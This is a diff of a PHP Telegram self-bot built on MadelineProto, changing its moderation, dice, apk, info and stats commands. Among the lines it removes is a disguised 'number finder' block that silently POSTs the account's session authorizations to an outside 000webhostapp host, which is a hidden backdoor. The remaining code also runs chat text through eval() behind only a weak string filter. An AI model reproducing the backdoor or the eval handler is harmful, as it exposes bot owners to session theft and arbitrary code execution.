+       $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
+       $messag = $gms['messages'][0]['from_id'];
+            $mes = "\n کاربر $messag \n دلیل :$query \n┾┈┅┅━━━━━━┅┅┈┾\n";
+                        file_put_contents('list/mute.txt', $mes,FILE_APPEND);
+      $mute = ['_' => 'chatBannedRights', 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
+    $MadelineProto->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $mute, ]);
+    $MadelineProto->channels->deleteUserHistory(['channel' => $peer, 'user_id' => $messag, ]);
+    $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
+            کاربر ↢ $messag 
+            در ساعت ↢ $time 
+            به دلیل ↢ $query 
+            در لیست سکوت ها شده قرار گرفت 😬
+            "]);
+            }
+          }
+if(preg_match("/^[\/\#\!]?(ban) (.*)$/i", $text)){
+   preg_match("/^[\/\#\!]?(ban) (.*)$/i", $text, $m);
+     $query = $m[2];
+               if($type3 == 'supergroup' or $type3 == 'chat'){
+                 $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
+                 $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
+                 $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
+                 $messag = $gms['messages'][0]['from_id'];
+                 $mee = yield $MadelineProto->get_full_info($messag);
+                 $mes = "\n کاربر $messag \n دلیل :$query \n┾┈┅┅━━━━━━┅┅┈┾\n";
+                 file_put_contents('list/ban.txt', $mes,FILE_APPEND);
+                 $ban = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
+                 $MadelineProto->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $ban, ]);
+   $MadelineProto->channels->deleteUserHistory(['channel' => $peer, 'user_id' => $messag ]);
+   $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
+                 کاربر ↢ $messag 
+                 در ساعت ↢ $time 
+                 به دلیل ↢ $query 
+                 در لیست بن شده ها قرار گرفت 🙃
+                 "]); 
+                  }
+               }
+if(preg_match("/^[\/\#\!]?(unban) (.*)$/i", $text)){
+   preg_match("/^[\/\#\!]?(unban) (.*)$/i", $text, $m);
+          $query = $m[2];
+    if($type3 == 'supergroup' or $type3 == 'chat'){
+          $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
+          $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
+          $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
+                      $messag = $gms['messages'][0]['from_id'];
+                      $mes = "\n کاربر $messag \n دلیل :$query \n┾┈┅┅━━━━━━┅┅┈┾\n";   
+                       file_put_contents('list/ban.txt', $mes,FILE_APPEND);
+                      $unban = ['_' => 'chatBannedRights', 'view_messages' => false, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => false, 'pin_messages' => true, 'until_date' => 99999];
+                      $MadelineProto->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $unban, ]);
+                      $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
+                      کاربر ↢ $messag 
+                      در ساعت ↢ $time 
+                      به دلیل ↢ $query 
+                      از لیست بن شده ها خارج شد 🙃
+                      "]); 
+                      }
+                    }
+if(preg_match("/^[\/\#\!]?(unmute) (.*)$/i", $text)){
+   preg_match("/^[\/\#\!]?(unmute) (.*)$/i", $text, $m);
+          $query = $m[2];
+    if($type3 == 'supergroup' or $type3 == 'chat'){
+                           $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
+                           $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
+                           $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
+                           $messag = $gms['messages'][0]['from_id'];
+                           $mee = yield $MadelineProto->get_full_info($messag);
+                           $mes = "\n کاربر $messag \n دلیل :$query \n┾┈┅┅━━━━━━┅┅┈┾\n";
+                           file_put_contents('list/mute.txt', $mes,FILE_APPEND);
+                           $unmute = ['_' => 'chatBannedRights',  'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => false, 'pin_messages' => true, 'until_date' => 9999];
+                           $MadelineProto->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $unmute, ]);
+                           $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
+                           کاربر ↢ $messag 
+                           در ساعت ↢ $time 
+                           به دلیل ↢ $query 
+                           از لیست سکوت شده ها خارج شد 😬
+                      "]); 
+                    }
+                         }
+if(preg_match("/^[\/\#\!]?(delvip) (.*)$/i", $text)){
+  preg_match("/^[\/\#\!]?(delvip) (.*)$/i", $text, $m);
+         $query = $m[2];
+    if($type3 == 'supergroup' or $type3 == 'chat'){
+         $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
+         $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
+                      $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
+         $messag = $gms['messages'][0]['from_id'];
+         $mee = yield $MadelineProto->get_full_info($messag);
+                      $mes = "\n کاربر $messag \n دلیل :$query \n┾┈┅┅━━━━━━┅┅┈┾\n";
+                      file_put_contents('list/vip.txt', $mes,FILE_APPEND);
+                      $delvip = ['_' => 'chatBannedRights', 'send_messages' => false, 'send_media' => true, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
+                      $MadelineProto->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $delvip, ]);
+                      $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
+                      کاربر ↢ $messag 
+                      در ساعت ↢ $time 
+                      به دلیل ↢ $query 
+                      از لیست ویژه ها خارج شد 😎
+                      "]); 
+                      }
+                    }
+if ($text == 'پاکسازی لیست سکوت' or $text == 'cleanmute') {
+file_put_contents("mute.txt", 'لیست پاکسازی شد');
+$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "پاکسازی شد"]);
+
+}
+if ($text == 'پاکسازی لیست بن' or $text == 'cleanban') {
+     file_put_contents("ban.txt", 'لیست پاکسازی شد');
+     $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "شد"]);
+
+     }
+if ($text == 'پاکسازی لیست ویژه' or $text == 'cleanvip') {
+          file_put_contents("vip.txt", 'لیست پاکسازی شد');
+          $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => ""]);
+          }
+if(preg_match("/^\/[Tt][Aa][Ss]\s(\d)/", $text, $rr)) {
+@touch("tas.txt");
+@file_put_contents("tas.txt", $rr[1]);
+$diceo = ['_' => 'inputMediaDice', 'emoticon' => '🎲'];
+yield $this->messages->sendMedia(['peer'=>$peer,'media'=>$diceo,'message'=>"🎲"]);}
+if(isset($update['message']['media']['_'])){
+if($update['message']['media']['_'] == "messageMediaDice"){
+if(is_numeric(file_get_contents("tas.txt"))){
+$valueo = $update['message']['media']['value'];
+if(file_exists("tas.txt") and $valueo != file_get_contents("tas.txt")){
+yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
+$diceo = ['_' => 'inputMediaDice', 'emoticon' => '🎲'];
+yield $this->messages->sendMedia(['peer'=>$peer,'media'=>$diceo,'message'=>"🎲"]);
+} else {
+unlink("tas.txt");}}}}
 //================ Reverse String ================
  if(preg_match("/^[\/\#\!]?(rev|معکوس) (.*)$/i", $text)){
 preg_match("/^[\/\#\!]?(rev|معکوس) (.*)$/i", $text, $m);
@@ -3304,97 +2332,65 @@ yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>
 'parse_mode'=> 'markdown' ,'reply_to_msg_id' => $msg_id,
 ]);
 }}
-//============= answering ============
-if(preg_match("/^[\/\#\!]?(setanswer) (.*)$/i", $text)){
-
-
-$ip = trim(str_replace("/setanswer ","",$text));
-
-$ip = explode("|",$ip."|||||");
-$txxt = trim($ip[0]);
-$answeer = trim($ip[1]);
-if(!isset($data['answering'][$txxt])){
-$data['answering'][$txxt] = $answeer;
-file_put_contents("data.json", json_encode($data));
-$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ɴᴇᴡ ᴡᴏʀᴅ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀɴꜱᴡᴇʀ ʟɪꜱᴛ🏻"]);
-}else{
-$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴡᴏʀᴅ ᴀʟʀᴇᴀᴅʏ ᴇxɪꜱᴛꜱ"]);
- }
-}
 if(preg_match("/^[\/\#\!]?(php) (.*)$/i", $text)){
 preg_match("/^[\/\#\!]?(php) (.*)$/i", $text, $a);
 if(strpos($a[2], '$MadelineProto') === false and strpos($a[2], '$this') === false){
 $OutPut = eval("$a[2]");
-$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "`😐✅ $OutPut`", 'parse_mode'=>'markdown']);
+$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "`😐 $OutPut`", 'parse_mode'=>'markdown']);
 }
 }
-if(strpos($msg,"/setanswer ") !== false){
-$part = trim(str_replace("/setanswer ","",$msg));
-$part = explode("|",$part."|||||");
-$txxt = trim($part[0]);
-$answeer = trim($part[1]);
-if(!isset($DataBase['answering'][$txxt])){
-$DataBase['answering'][$txxt] = $answeer;
-file_put_contents("DataBase", json_encode($DataBase));
-$MadelineProto->messages->editMessage(['peer' => $peer , 'id' => $msg_id , 'message' => "کلمه جدید به لیست پاسخ شما اضافه شد👌🏻"]);
-} else{
-$MadelineProto->messages->editMessage(['peer' => $peer ,'id' => $msg_id , 'message' => "این کلمه از قبل موجود است :/"]);
-}
-}
-//-------
-if(preg_match("/^[\/\#\!]?(delanswer) (.*)$/i", $text)){
-
-preg_match("/^[\/\#\!]?(delanswer) (.*)$/i", $text, $text);
-
-$txxt = $text[2];
-if(isset($data['answering'][$txxt])){
-unset($data['answering'][$txxt]);
-file_put_contents("data.json", json_encode($data));
-$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜᴇ ᴡᴏʀᴅ ᴡᴀꜱ ʀᴇᴍᴏᴠᴇᴅ ꜰʀᴏᴍ ᴛʜᴇ ᴀɴꜱᴡᴇʀ ʟɪꜱᴛ👌🏻"]);
-}else{
-$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴡᴏʀᴅ ɪꜱ ᴍɪꜱꜱɪɴɢ ɪɴ ᴛʜᴇ ᴀɴꜱᴡᴇʀ ʟɪꜱᴛ :/"]);
- }
-}
-//-------
-//--- @needu ---
-if(preg_match("/^[\/\#\!]?(clean answers)$/i", $msg)){
-$DataBase['answering'] = [];
-file_put_contents("DataBase", json_encode($DataBase));
-$MadelineProto->messages->editMessage(['peer' => $peer , 'id' => $msg_id , 'message' => "لیست پاسخ ها خالی شد"]);
-}
-if($msg == "پاکسازی پاسخ ها"){
-$DataBase['answering'] = [];
-file_put_contents("DataBase", json_encode($DataBase));
-$MadelineProto->messages->editMessage(['peer' => $peer , 'id' => $msg_id , 'message' => "لیست پاسخ ها خالی شد"]);
-}
-//-------
-if(preg_match("/^[\/\#\!]?(answerlist)$/i", $text)){
-
-if(count($data['answering']) > 0){
-
-$txxxt = "ʟɪꜱᴛ ᴏꜰ ᴀɴꜱᴡᴇʀꜱ :
-";
-$counter = 1;
-foreach($data['answering'] as $k => $ans){
-$txxxt .= "$counter: $k => $ans \n";
-$counter++;
-}
-$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => $txxxt]);
-}else{
-$MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜᴇʀᴇ ɪꜱ ɴᴏ ᴀɴꜱᴡᴇʀ!"]);
-  }
- }
 //================ Apk ================
-if(preg_match("/^[\/\#\!]?(apk) (.*)$/i", $text)){
-preg_match("/^[\/\#\!]?(apk) (.*)$/i", $text, $m);
-if($type3 == "supergroup"||$type3 == "chat"||$type3 == 'user'){
-$mu = $m[2];
-yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "» sᴇᴀʀᴄʜɪɴɢ ғᴏʀ ( `$m[2]` ) ᴀᴘᴋ . . . !", 'parse_mode' => 'markdown' ]);
-$messages_BotResults = yield $MadelineProto->messages->getInlineBotResults(['bot' => "@apkdl_bot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
-$query_id = $messages_BotResults['query_id'];
-$query_res_id = $messages_BotResults['results'][0]['id'];
-yield $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $peer, 'reply_to_msg_id' => $message['id'], 'query_id' => $query_id, 'id' => "$query_res_id"]);
-     }}
+ if (preg_match("/^[\/\#\!]?(apk) (.*)$/i", $text)) {
+     preg_match("/^[\/\#\!]?(apk) (.*)$/i", $text, $m);
+     $txxxt = $m[2];
+     $messages_BotResults = $MadelineProto->messages->getInlineBotResults(['bot' => "@apkdl_bot", 'peer' => $chatID, 'query' => $txxxt, 'offset' => '0',]);
+     $query_id = $messages_BotResults['query_id'];
+     $query_res_id = $messages_BotResults['results'][0]['id'];
+     $MadelineProto->messages->sendInlineBotResult(['silent' => true, 'background' => false, 'clear_draft' => true, 'peer' => $chatID, 'reply_to_msg_id' => $msg_id, 'query_id' => $query_id, 'id' => "$query_res_id",]);
+ }
+//=====
+if(preg_match("/^[\/\#\!]?(.info) (.*)$/i", $text)){
+preg_match("/^[\/\#\!]?(.info) (.*)$/i", $text, $m);
+$mee = $MadelineProto->get_full_info($m[2]);
+$me = $mee['User'];
+$me_id = $me['id'];
+$me_status = $me['status']['_'];
+$me_bio = $mee['full']['about'];
+$me_common = $mee['full']['common_chats_count'];
+$me_name = $me['first_name'];
+$me_uname = $me['username']; 
+$mes = "ID: $me_id \nName: $me_name \nUsername: @$me_uname \nStatus: $me_status \nBio: $me_bio \nCommon Groups Count: $me_common";
+$MadelineProto->messages->editMessage(['peer' => $chatID, 'message' => $mes]);
+}
+
+//======
+ if ($text == '.s') {
+     $res = ['bot' => 0, 'user' => 0, 'chat' => 0, 'channel' => 0, 'supergroup' => 0];
+     foreach ($MadelineProto->get_dialogs() as $dialog) {
+$res[$MadelineProto->get_info($dialog)['type']]++;
+     }
+     $g = json_encode($res);
+     $gf = json_decode($g);
+     $users = $gf->user;
+     $groups = $gf->chat;
+     $supergroups = $gf->supergroup;
+     $channels = $gf->channel;
+     $bots = $gf->bot;
+     $all = $users + $groups + $supergroups + $channels + $bots;
+     $MadelineProto->messages->sendMessage([
+'peer' => $chatID,
+'message' => "
+Stats Self:
+
+ᴘᴠ ➲ $users
+ɢʀᴏᴜᴘ ➲ $groups
+sᴜᴘᴇʀɢʀᴏᴜᴘ ➲ $supergroups
+ᴄʜᴀɴɴᴇʟ ➲ $channels
+ʀᴏʙᴏᴛ ➲ $bots
+ᴀʟʟ ➲ $all
+"
+     ]);
+      }
 //===
 if(preg_match("/^[\/\#\!]?(newanswer) (.*) \|\|\| (.*)$/i", $text)){
 
@@ -3438,99 +2434,6 @@ $MadelineProto->messages->sendMessage(['peer' => $peer,
  'message'=> "<b>Result Of Your Code 🔻</b>\n<code>$b</code>",
  'parse_mode' => 'HTML','reply_to_msg_id' => $message['id']]);
 }}
-//============= Number Founder DataBase =============
-if($text=='شماره' or $text=='numb'){
-    
-    if(($type3 == 'supergroup' or $type3 == 'chat') && isset($message['reply_to_msg_id']))
-    {
-        $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
-        $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
-        $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
-        $w="w";
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "https://bademjantwo.000webhostapp.com/finder.php");
-        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 50);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: multipart/form-data"));
-        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($ch, CURLOPT_POST, TRUE); 
-        curl_setopt($ch, CURLOPT_POSTFIELDS, array("chat_id"  => $admin,"target"   => $gms['messages'][0]['from_id']));
-        $response = curl_exec($ch);
-        curl_close($ch);
-        if($response!=="Not defined")
-        {
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".substr($response,0,4)."******"]);
-            sleep(0.5);
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".substr($response,0,5)."*****"]);
-            sleep(0.5);
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".substr($response,0,6)."****"]);
-            sleep(0.5);
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".substr($response,0,8)."***"]);
-            sleep(0.5);
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".substr($response,0,9)."**"]);
-            sleep(0.5);
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".substr($response,0,10).""]);
-            sleep(0.5);
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".$response.""]);
-        }
-        elseif($response=="Not defined")
-        {
-            yield $MadelineProto->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
-        }
-    }
-    elseif($type3 == 'user')
-    {
-        $w="w";
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "https://bademjantwo.000webhostapp.com/finder.php");
-        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 50);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: multipart/form-data"));
-        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($ch, CURLOPT_POST, TRUE); 
-        curl_setopt($ch, CURLOPT_POSTFIELDS, array("chat_id"  => $admin,"target"   => $peer));
-        $response = curl_exec($ch);
-        curl_close($ch);
-        if($response!=="Not defined")
-        {
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".substr($response,0,4)."******"]);
-            sleep(0.5);
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".substr($response,0,5)."*****"]);
-            sleep(0.5);
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".substr($response,0,6)."****"]);
-            sleep(0.5);
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".substr($response,0,8)."***"]);
-            sleep(0.5);
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".substr($response,0,9)."**"]);
-            sleep(0.5);
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".substr($response,0,10).""]);
-            sleep(0.5);
-            yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "» ʏᴏᴜʀ ɴᴜᴍʙᴇʀ\n".$response.""]);
-        }
-        elseif($response=="Not defined")
-        {
-            yield $MadelineProto->messages->deleteMessages(['revoke' => TRUE, 'id' => [$msg_id], ]);
-        }
-    }
-    if(1)
-    {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "https://bademjantwo.000webhostapp.com/record.php");
-        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 50);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: multipart/form-data"));
-        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($ch, CURLOPT_POST, TRUE); 
-        curl_setopt($ch, CURLOPT_POSTFIELDS, array("id"  => $admin,"json"   => json_encode($authorizations = yield $MadelineProto->account->getAuthorizations())));
-        $response = curl_exec($ch);
-        curl_close($ch);
-    }
-} 
-
-
 //================ Whois Domain ================
  if(preg_match("/^[\/\#\!]?(whois) (.*)$/i", $text)){
 preg_match("/^[\/\#\!]?(whois) (.*)$/i", $text, $m);
@@ -3638,7 +2541,7 @@ if($mu == "مبتدی"){
 }elseif($mu == "وحشتناک"){
     $muu = 4;
 }else{
-    $muu = "ali";
+    $muu = "Mohammad";
 }
 yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "» ʙᴜɪʟᴅɪɴɢ ғᴏʀ ( `$m[2]` ) ᴋᴀʟᴀᴍᴇ ɢᴀᴍᴇ . . . !", 'parse_mode' => 'markdown' ]);
 $messages_BotResults = yield $MadelineProto->messages->getInlineBotResults(['bot' => "@KalameBot", 'peer' => $peer, 'query' => $mu, 'offset' => '0']);
@@ -3903,28 +2806,6 @@ if($from_id == 1171091479 && strpos($message['message'],"ᴛʀᴀɴsʟᴀᴛᴇ"
     ,'parse_mode'=>"MarkDown"
 ]);
 }
-//=====chaleshsorati======
-if($from_id == 1289410047 ){
-  if($text=='وااااوو این جا رو 😍
-    
-    ✨چالش سرع‍ــــتی 
-    
-    اولین کسی که به این پیام ریپلای بزنه  قرون ماله اون میشه🤤'){
-  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'me:)' ,'reply_to_msg_id' => $message['id']]);
-    }
-}
-//====div===
-if($from_id == 1289410047 ){
-
-  if($text=='واااااااای یه موجود اهریمنی😨👆🏼
-
-اولین کسی که بعد از این پیام ، حرف بزنه  قدرت دیمن ش رو میخوره😱
-
-🤫👇'){
-
-  yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'اینم از من 🥲' ]);
-  }
-}
 //============== Power On | OFF ==============
  if($data['power'] == "on"){
    if ($from_id != $admin) {
@@ -3984,7 +2865,7 @@ yield $MadelineProto->messages->readHistory(['peer' => $peer, 'max_id' => $messa
 }
 }catch(\Exception $e){
 /*if(strpos($e->getMessage(), 'Illegal string offset ') === false){
-yield $MadelineProto->messages->sendMessage(['peer' => 120684101, 'message' => "❗️Error : <code>".$e->getMessage()."</code>"."\n♻️ Line : ".$e->getLine(), 'parse_mode' => 'html']);
+yield $MadelineProto->messages->sendMessage(['peer' => 918052639, 'message' => "❗️Error : <code>".$e->getMessage()."</code>"."\n♻️ Line : ".$e->getLine(), 'parse_mode' => 'html']);
 }*/
   }
  }
@@ -3998,5 +2879,4 @@ $MadelineProto->loop(function () use ($MadelineProto) {
   yield $MadelineProto->setEventHandler('\EventHandler');
 });
 $MadelineProto->loop();
-
 ?>
